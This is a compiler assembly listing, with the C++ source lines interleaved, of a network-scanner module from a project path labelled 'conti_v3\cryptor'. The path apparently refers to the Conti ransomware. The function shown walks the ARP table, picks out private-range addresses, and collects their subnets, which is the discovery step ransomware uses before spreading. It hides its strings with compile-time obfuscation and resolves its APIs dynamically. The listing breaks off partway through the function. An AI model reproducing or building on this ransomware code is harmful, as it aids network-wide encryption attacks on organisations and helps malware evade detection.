??0?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
;	COMDAT ?GetSubnets@@YAHPEAUsubnet_list_@@@Z
_TEXT	SEGMENT
TableSize$ = 4
IpNetTable$ = 40
Result$ = 68
i$8 = 100
wszIpAddress$9 = 136
dwAddress$10 = 212
HardwareAddres$11 = 248
HardwareAddressSize$12 = 276
InAddr$13 = 308
szIpAddress$14 = 344
le$15 = 372
p1$16 = 408
p2$17 = 440
p3$18 = 472
p4$19 = 504
Found$20 = 532
SubnetInfo$21 = 568
bAddres$22 = 596
NewSubnet$23 = 632
$T24 = 1248
$T25 = 1376
$T26 = 1492
$T27 = 1528
$T28 = 1572
$T29 = 1604
$T30 = 1640
tv85 = 1652
tv68 = 1652
__$ArrayPad$ = 1656
SubnetList$ = 1696
?GetSubnets@@YAHPEAUsubnet_list_@@@Z PROC		; GetSubnets, COMDAT

; 135  : {

$LN22:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec a8 06
	00 00		 sub	 rsp, 1704		; 000006a8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 7c 24 20	 lea	 rdi, QWORD PTR [rsp+32]
  00018	b9 12 01 00 00	 mov	 ecx, 274		; 00000112H
  0001d	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
  00022	f3 ab		 rep stosd
  00024	48 8b 8c 24 c8
	06 00 00	 mov	 rcx, QWORD PTR [rsp+1736]
  0002c	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  00033	48 33 c5	 xor	 rax, rbp
  00036	48 89 85 78 06
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp], rax
  0003d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__AF241CAA_network_scanner@cpp
  00044	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 136  : 	ULONG TableSize = 0;

  00049	c7 45 04 00 00
	00 00		 mov	 DWORD PTR TableSize$[rbp], 0

; 137  : 	PMIB_IPNETTABLE IpNetTable = NULL;

  00050	48 c7 45 28 00
	00 00 00	 mov	 QWORD PTR IpNetTable$[rbp], 0

; 138  : 
; 139  : 	pGetIpNetTable(IpNetTable, &TableSize, FALSE);

  00058	45 33 c0	 xor	 r8d, r8d
  0005b	48 8d 55 04	 lea	 rdx, QWORD PTR TableSize$[rbp]
  0005f	48 8b 4d 28	 mov	 rcx, QWORD PTR IpNetTable$[rbp]
  00063	e8 00 00 00 00	 call	 ?pGetIpNetTable@@YAKPEAU_MIB_IPNETTABLE@@PEAKH@Z ; pGetIpNetTable

; 140  : 	if (!TableSize) {

  00068	83 7d 04 00	 cmp	 DWORD PTR TableSize$[rbp], 0
  0006c	75 3d		 jne	 SHORT $LN11@GetSubnets

; 141  : 
; 142  : 		logs::Write(OBFW(L"GetIpNetTable fails. GetLastError = %lu"), pGetLastError());

  0006e	e8 00 00 00 00	 call	 ?pGetLastError@@YAKXZ	; pGetLastError
  00073	89 85 74 06 00
	00		 mov	 DWORD PTR tv68[rbp], eax
  00079	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_1FA@PDLBHGMH@?$AAG?$AAe?$AAt?$AAI?$AAp?$AAN?$AAe?$AAt?$AAT?$AAa?$AAb?$AAl?$AAe?$AA?5?$AAf@
  00080	48 8d 8d e0 04
	00 00		 lea	 rcx, QWORD PTR $T24[rbp]
  00087	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEAA@PEBE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >
  0008c	48 8b c8	 mov	 rcx, rax
  0008f	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEAAPEBDXZ ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::decrypt
  00094	8b 8d 74 06 00
	00		 mov	 ecx, DWORD PTR tv68[rbp]
  0009a	8b d1		 mov	 edx, ecx
  0009c	48 8b c8	 mov	 rcx, rax
  0009f	e8 00 00 00 00	 call	 ?Write@logs@@YAXPEB_WZZ	; logs::Write

; 143  : 		return FALSE;

  000a4	33 c0		 xor	 eax, eax
  000a6	e9 7c 03 00 00	 jmp	 $LN1@GetSubnets
$LN11@GetSubnets:

; 144  : 
; 145  : 	}
; 146  : 
; 147  : 	IpNetTable = (PMIB_IPNETTABLE)m_malloc(TableSize);

  000ab	8b 45 04	 mov	 eax, DWORD PTR TableSize$[rbp]
  000ae	8b c8		 mov	 ecx, eax
  000b0	e8 00 00 00 00	 call	 ?m_malloc@@YAPEAX_K@Z	; m_malloc
  000b5	48 89 45 28	 mov	 QWORD PTR IpNetTable$[rbp], rax

; 148  : 	if (!IpNetTable) {

  000b9	48 83 7d 28 00	 cmp	 QWORD PTR IpNetTable$[rbp], 0
  000be	75 07		 jne	 SHORT $LN12@GetSubnets

; 149  : 		return FALSE;

  000c0	33 c0		 xor	 eax, eax
  000c2	e9 60 03 00 00	 jmp	 $LN1@GetSubnets
$LN12@GetSubnets:

; 150  : 	}
; 151  : 
; 152  : 	ULONG Result = (ULONG)pGetIpNetTable(IpNetTable, &TableSize, FALSE);

  000c7	45 33 c0	 xor	 r8d, r8d
  000ca	48 8d 55 04	 lea	 rdx, QWORD PTR TableSize$[rbp]
  000ce	48 8b 4d 28	 mov	 rcx, QWORD PTR IpNetTable$[rbp]
  000d2	e8 00 00 00 00	 call	 ?pGetIpNetTable@@YAKPEAU_MIB_IPNETTABLE@@PEAKH@Z ; pGetIpNetTable
  000d7	89 45 44	 mov	 DWORD PTR Result$[rbp], eax

; 153  : 	if (Result != ERROR_SUCCESS) {

  000da	83 7d 44 00	 cmp	 DWORD PTR Result$[rbp], 0
  000de	74 46		 je	 SHORT $LN13@GetSubnets

; 154  : 		
; 155  : 		logs::Write(OBFW(L"GetIpNetTable fails. GetLastError = %lu"), pGetLastError());

  000e0	e8 00 00 00 00	 call	 ?pGetLastError@@YAKXZ	; pGetLastError
  000e5	89 85 74 06 00
	00		 mov	 DWORD PTR tv85[rbp], eax
  000eb	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_1FA@PDLBHGMH@?$AAG?$AAe?$AAt?$AAI?$AAp?$AAN?$AAe?$AAt?$AAT?$AAa?$AAb?$AAl?$AAe?$AA?5?$AAf@
  000f2	48 8d 8d 60 05
	00 00		 lea	 rcx, QWORD PTR $T25[rbp]
  000f9	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEAA@PEBE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >
  000fe	48 8b c8	 mov	 rcx, rax
  00101	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEAAPEBDXZ ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::decrypt
  00106	8b 8d 74 06 00
	00		 mov	 ecx, DWORD PTR tv85[rbp]
  0010c	8b d1		 mov	 edx, ecx
  0010e	48 8b c8	 mov	 rcx, rax
  00111	e8 00 00 00 00	 call	 ?Write@logs@@YAXPEB_WZZ	; logs::Write

; 156  : 		free(IpNetTable);

  00116	48 8b 4d 28	 mov	 rcx, QWORD PTR IpNetTable$[rbp]
  0011a	e8 00 00 00 00	 call	 free

; 157  : 		return FALSE;

  0011f	33 c0		 xor	 eax, eax
  00121	e9 01 03 00 00	 jmp	 $LN1@GetSubnets
$LN13@GetSubnets:

; 158  : 
; 159  : 	}
; 160  : 
; 161  : 	for (ULONG i = 0; i < IpNetTable->dwNumEntries; i++) {

  00126	c7 45 64 00 00
	00 00		 mov	 DWORD PTR i$8[rbp], 0
  0012d	eb 08		 jmp	 SHORT $LN4@GetSubnets
$LN2@GetSubnets:
  0012f	8b 45 64	 mov	 eax, DWORD PTR i$8[rbp]
  00132	ff c0		 inc	 eax
  00134	89 45 64	 mov	 DWORD PTR i$8[rbp], eax
$LN4@GetSubnets:
  00137	48 8b 45 28	 mov	 rax, QWORD PTR IpNetTable$[rbp]
  0013b	8b 00		 mov	 eax, DWORD PTR [rax]
  0013d	39 45 64	 cmp	 DWORD PTR i$8[rbp], eax
  00140	0f 83 d3 02 00
	00		 jae	 $LN3@GetSubnets

; 162  : 
; 163  : 		WCHAR wszIpAddress[INET_ADDRSTRLEN];
; 164  : 		ULONG dwAddress = IpNetTable->table[i].dwAddr;	

  00146	8b 45 64	 mov	 eax, DWORD PTR i$8[rbp]
  00149	48 6b c0 18	 imul	 rax, rax, 24
  0014d	48 8b 4d 28	 mov	 rcx, QWORD PTR IpNetTable$[rbp]
  00151	8b 44 01 14	 mov	 eax, DWORD PTR [rcx+rax+20]
  00155	89 85 d4 00 00
	00		 mov	 DWORD PTR dwAddress$10[rbp], eax

; 165  : 		PUCHAR HardwareAddres = IpNetTable->table[i].bPhysAddr;

  0015b	8b 45 64	 mov	 eax, DWORD PTR i$8[rbp]
  0015e	48 6b c0 18	 imul	 rax, rax, 24
  00162	48 8b 4d 28	 mov	 rcx, QWORD PTR IpNetTable$[rbp]
  00166	48 8d 44 01 0c	 lea	 rax, QWORD PTR [rcx+rax+12]
  0016b	48 89 85 f8 00
	00 00		 mov	 QWORD PTR HardwareAddres$11[rbp], rax

; 166  : 		ULONG HardwareAddressSize = IpNetTable->table[i].dwPhysAddrLen;

  00172	8b 45 64	 mov	 eax, DWORD PTR i$8[rbp]
  00175	48 6b c0 18	 imul	 rax, rax, 24
  00179	48 8b 4d 28	 mov	 rcx, QWORD PTR IpNetTable$[rbp]
  0017d	8b 44 01 08	 mov	 eax, DWORD PTR [rcx+rax+8]
  00181	89 85 14 01 00
	00		 mov	 DWORD PTR HardwareAddressSize$12[rbp], eax

; 167  : 		
; 168  : 		RtlSecureZeroMemory(wszIpAddress, sizeof(wszIpAddress));

  00187	ba 2c 00 00 00	 mov	 edx, 44			; 0000002cH
  0018c	48 8d 8d 88 00
	00 00		 lea	 rcx, QWORD PTR wszIpAddress$9[rbp]
  00193	e8 00 00 00 00	 call	 RtlSecureZeroMemory

; 169  : 
; 170  : 		IN_ADDR InAddr;
; 171  : 		InAddr.S_un.S_addr = dwAddress;

  00198	8b 85 d4 00 00
	00		 mov	 eax, DWORD PTR dwAddress$10[rbp]
  0019e	89 85 34 01 00
	00		 mov	 DWORD PTR InAddr$13[rbp], eax

; 172  : 		PCHAR szIpAddress = pinet_ntoa(InAddr);

  001a4	8b 8d 34 01 00
	00		 mov	 ecx, DWORD PTR InAddr$13[rbp]
  001aa	e8 00 00 00 00	 call	 ?pinet_ntoa@@YAPEADUin_addr@@@Z ; pinet_ntoa
  001af	48 89 85 58 01
	00 00		 mov	 QWORD PTR szIpAddress$14[rbp], rax

; 173  : 		DWORD le = WSAGetLastError();

  001b6	ff 15 00 00 00
	00		 call	 QWORD PTR __imp_WSAGetLastError
  001bc	89 85 74 01 00
	00		 mov	 DWORD PTR le$15[rbp], eax

; 174  : 
; 175  : 		PCSTR p1 = (PCSTR)pStrStrIA(szIpAddress, OBFA("172."));

  001c2	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_04OEIIGBBO@172?4@
  001c9	48 8d 8d d4 05
	00 00		 lea	 rcx, QWORD PTR $T26[rbp]
  001d0	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0BN@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEAA@PEBE@Z ; MetaBuffer<29,68,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::MetaBuffer<29,68,std::integer_sequence<unsigned __int64,0,1,2,3,4> >
  001d5	48 8b c8	 mov	 rcx, rax
  001d8	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BN@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEAAPEBDXZ ; MetaBuffer<29,68,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::decrypt
  001dd	48 8b d0	 mov	 rdx, rax
  001e0	48 8b 8d 58 01
	00 00		 mov	 rcx, QWORD PTR szIpAddress$14[rbp]
  001e7	e8 00 00 00 00	 call	 ?pStrStrIA@@YAPEBDPEBD0@Z ; pStrStrIA
  001ec	48 89 85 98 01
	00 00		 mov	 QWORD PTR p1$16[rbp], rax

; 176  : 		PCSTR p2 = (PCSTR)pStrStrIA(szIpAddress, OBFA("192.168."));

  001f3	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_08NABKCMOE@192?4168?4@
  001fa	48 8d 8d f8 05
	00 00		 lea	 rcx, QWORD PTR $T27[rbp]
  00201	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$04$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@QEAA@PEBE@Z ; MetaBuffer<5,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8> >::MetaBuffer<5,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8> >
  00206	48 8b c8	 mov	 rcx, rax
  00209	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$04$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@QEAAPEBDXZ ; MetaBuffer<5,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8> >::decrypt
  0020e	48 8b d0	 mov	 rdx, rax
  00211	48 8b 8d 58 01
	00 00		 mov	 rcx, QWORD PTR szIpAddress$14[rbp]
  00218	e8 00 00 00 00	 call	 ?pStrStrIA@@YAPEBDPEBD0@Z ; pStrStrIA
  0021d	48 89 85 b8 01
	00 00		 mov	 QWORD PTR p2$17[rbp], rax

; 177  : 		PCSTR p3 = (PCSTR)pStrStrIA(szIpAddress, OBFA("10."));

  00224	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_03LJEAFDJL@10?4@
  0022b	48 8d 8d 24 06
	00 00		 lea	 rcx, QWORD PTR $T28[rbp]
  00232	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0N@$0CM@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z ; MetaBuffer<13,44,std::integer_sequence<unsigned __int64,0,1,2,3> >::MetaBuffer<13,44,std::integer_sequence<unsigned __int64,0,1,2,3> >
  00237	48 8b c8	 mov	 rcx, rax
  0023a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0N@$0CM@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ ; MetaBuffer<13,44,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt
  0023f	48 8b d0	 mov	 rdx, rax
  00242	48 8b 8d 58 01
	00 00		 mov	 rcx, QWORD PTR szIpAddress$14[rbp]
  00249	e8 00 00 00 00	 call	 ?pStrStrIA@@YAPEBDPEBD0@Z ; pStrStrIA
  0024e	48 89 85 d8 01
	00 00		 mov	 QWORD PTR p3$18[rbp], rax

; 178  : 		PCSTR p4 = (PCSTR)pStrStrIA(szIpAddress, OBFA("169."));

  00255	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_04FAGBOJJK@169?4@
  0025c	48 8d 8d 44 06
	00 00		 lea	 rcx, QWORD PTR $T29[rbp]
  00263	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0ED@$0DF@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEAA@PEBE@Z ; MetaBuffer<67,53,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::MetaBuffer<67,53,std::integer_sequence<unsigned __int64,0,1,2,3,4> >
  00268	48 8b c8	 mov	 rcx, rax
  0026b	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0ED@$0DF@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEAAPEBDXZ ; MetaBuffer<67,53,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::decrypt
  00270	48 8b d0	 mov	 rdx, rax
  00273	48 8b 8d 58 01
	00 00		 mov	 rcx, QWORD PTR szIpAddress$14[rbp]
  0027a	e8 00 00 00 00	 call	 ?pStrStrIA@@YAPEBDPEBD0@Z ; pStrStrIA
  0027f	48 89 85 f8 01
	00 00		 mov	 QWORD PTR p4$19[rbp], rax

; 179  : 
; 180  : 		if (p1 == szIpAddress ||
; 181  : 			p2 == szIpAddress ||
; 182  : 			p3 == szIpAddress ||

  00286	48 8b 85 58 01
	00 00		 mov	 rax, QWORD PTR szIpAddress$14[rbp]
  0028d	48 39 85 98 01
	00 00		 cmp	 QWORD PTR p1$16[rbp], rax
  00294	74 34		 je	 SHORT $LN15@GetSubnets
  00296	48 8b 85 58 01
	00 00		 mov	 rax, QWORD PTR szIpAddress$14[rbp]
  0029d	48 39 85 b8 01
	00 00		 cmp	 QWORD PTR p2$17[rbp], rax
  002a4	74 24		 je	 SHORT $LN15@GetSubnets
  002a6	48 8b 85 58 01
	00 00		 mov	 rax, QWORD PTR szIpAddress$14[rbp]
  002ad	48 39 85 d8 01
	00 00		 cmp	 QWORD PTR p3$18[rbp], rax
  002b4	74 14		 je	 SHORT $LN15@GetSubnets
  002b6	48 8b 85 58 01
	00 00		 mov	 rax, QWORD PTR szIpAddress$14[rbp]
  002bd	48 39 85 f8 01
	00 00		 cmp	 QWORD PTR p4$19[rbp], rax
  002c4	0f 85 4a 01 00
	00		 jne	 $LN14@GetSubnets
$LN15@GetSubnets:

; 183  : 			p4 == szIpAddress)
; 184  : 		{
; 185  : 
; 186  : 			BOOL Found = FALSE;

  002ca	c7 85 14 02 00
	00 00 00 00 00	 mov	 DWORD PTR Found$20[rbp], 0

; 187  : 
; 188  : 			PSUBNET_INFO SubnetInfo = NULL;

  002d4	48 c7 85 38 02
	00 00 00 00 00
	00		 mov	 QWORD PTR SubnetInfo$21[rbp], 0

; 189  : 			TAILQ_FOREACH(SubnetInfo, SubnetList, Entries) {

  002df	48 8b 85 a0 06
	00 00		 mov	 rax, QWORD PTR SubnetList$[rbp]
  002e6	48 8b 00	 mov	 rax, QWORD PTR [rax]
  002e9	48 89 85 38 02
	00 00		 mov	 QWORD PTR SubnetInfo$21[rbp], rax
  002f0	eb 12		 jmp	 SHORT $LN7@GetSubnets
$LN5@GetSubnets:
  002f2	48 8b 85 38 02
	00 00		 mov	 rax, QWORD PTR SubnetInfo$21[rbp]
  002f9	48 8b 40 08	 mov	 rax, QWORD PTR [rax+8]
  002fd	48 89 85 38 02
	00 00		 mov	 QWORD PTR SubnetInfo$21[rbp], rax
$LN7@GetSubnets:
  00304	48 83 bd 38 02
	00 00 00	 cmp	 QWORD PTR SubnetInfo$21[rbp], 0
  0030c	74 2e		 je	 SHORT $LN6@GetSubnets

; 190  : 
; 191  : 				if (!memcmp(&SubnetInfo->dwAddress, &dwAddress, 3)) {

  0030e	48 8b 85 38 02
	00 00		 mov	 rax, QWORD PTR SubnetInfo$21[rbp]
  00315	41 b8 03 00 00
	00		 mov	 r8d, 3
  0031b	48 8d 95 d4 00
	00 00		 lea	 rdx, QWORD PTR dwAddress$10[rbp]
  00322	48 8b c8	 mov	 rcx, rax
  00325	e8 00 00 00 00	 call	 memcmp
  0032a	85 c0		 test	 eax, eax
  0032c	75 0c		 jne	 SHORT $LN16@GetSubnets

; 192  : 
; 193  : 					Found = TRUE;

  0032e	c7 85 14 02 00
	00 01 00 00 00	 mov	 DWORD PTR Found$20[rbp], 1

; 194  : 					break;

  00338	eb 02		 jmp	 SHORT $LN6@GetSubnets
$LN16@GetSubnets:

; 195  : 
; 196  : 				}
; 197  : 
; 198  : 			}

  0033a	eb b6		 jmp	 SHORT $LN5@GetSubnets
$LN6@GetSubnets:

; 199  : 			
; 200  : 			if (!Found) {

  0033c	83 bd 14 02 00
	00 00		 cmp	 DWORD PTR Found$20[rbp], 0
  00343	0f 85 cb 00 00
	00		 jne	 $LN17@GetSubnets

; 201  : 
; 202  : 				BYTE bAddres[4];
; 203  : 				*(ULONG*)bAddres = dwAddress;

  00349	8b 85 d4 00 00
	00		 mov	 eax, DWORD PTR dwAddress$10[rbp]
  0034f	89 85 54 02 00
	00		 mov	 DWORD PTR bAddres$22[rbp], eax

; 204  : 				bAddres[3] = 0;

  00355	b8 01 00 00 00	 mov	 eax, 1
  0035a	48 6b c0 03	 imul	 rax, rax, 3
  0035e	48 89 85 68 06
	00 00		 mov	 QWORD PTR $T30[rbp], rax
  00365	48 83 bd 68 06
	00 00 04	 cmp	 QWORD PTR $T30[rbp], 4
  0036d	73 02		 jae	 SHORT $LN20@GetSubnets
  0036f	eb 05		 jmp	 SHORT $LN21@GetSubnets
$LN20@GetSubnets:
  00371	e8 00 00 00 00	 call	 __report_rangecheckfailure
$LN21@GetSubnets:
  00376	48 8b 85 68 06
	00 00		 mov	 rax, QWORD PTR $T30[rbp]
  0037d	c6 84 05 54 02
	00 00 00	 mov	 BYTE PTR bAddres$22[rbp+rax], 0

; 205  : 
; 206  : 				PSUBNET_INFO NewSubnet = (PSUBNET_INFO)m_malloc(sizeof(SUBNET_INFO));

  00385	b9 18 00 00 00	 mov	 ecx, 24
  0038a	e8 00 00 00 00	 call	 ?m_malloc@@YAPEAX_K@Z	; m_malloc
  0038f	48 89 85 78 02
	00 00		 mov	 QWORD PTR NewSubnet$23[rbp], rax

; 207  : 				if (!NewSubnet) {

  00396	48 83 bd 78 02
	00 00 00	 cmp	 QWORD PTR NewSubnet$23[rbp], 0
  0039e	75 02		 jne	 SHORT $LN18@GetSubnets

; 208  : 					break;

  003a0	eb 77		 jmp	 SHORT $LN3@GetSubnets
$LN18@GetSubnets:

; 209  : 				}
; 210  : 
; 211  : 				RtlCopyMemory(&NewSubnet->dwAddress, bAddres, 4);

  003a2	48 8b 85 78 02
	00 00		 mov	 rax, QWORD PTR NewSubnet$23[rbp]
  003a9	41 b8 04 00 00
	00		 mov	 r8d, 4
  003af	48 8d 95 54 02
	00 00		 lea	 rdx, QWORD PTR bAddres$22[rbp]
  003b6	48 8b c8	 mov	 rcx, rax
  003b9	e8 00 00 00 00	 call	 memcpy
$LN10@GetSubnets:

; 212  : 				TAILQ_INSERT_TAIL(SubnetList, NewSubnet, Entries);

  003be	48 8b 85 78 02
	00 00		 mov	 rax, QWORD PTR NewSubnet$23[rbp]
  003c5	48 c7 40 08 00
	00 00 00	 mov	 QWORD PTR [rax+8], 0
  003cd	48 8b 85 78 02
	00 00		 mov	 rax, QWORD PTR NewSubnet$23[rbp]
  003d4	48 8b 8d a0 06
	00 00		 mov	 rcx, QWORD PTR SubnetList$[rbp]
  003db	48 8b 49 08	 mov	 rcx, QWORD PTR [rcx+8]
  003df	48 89 48 10	 mov	 QWORD PTR [rax+16], rcx
  003e3	48 8b 85 a0 06
	00 00		 mov	 rax, QWORD PTR SubnetList$[rbp]
  003ea	48 8b 40 08	 mov	 rax, QWORD PTR [rax+8]
  003ee	48 8b 8d 78 02
	00 00		 mov	 rcx, QWORD PTR NewSubnet$23[rbp]
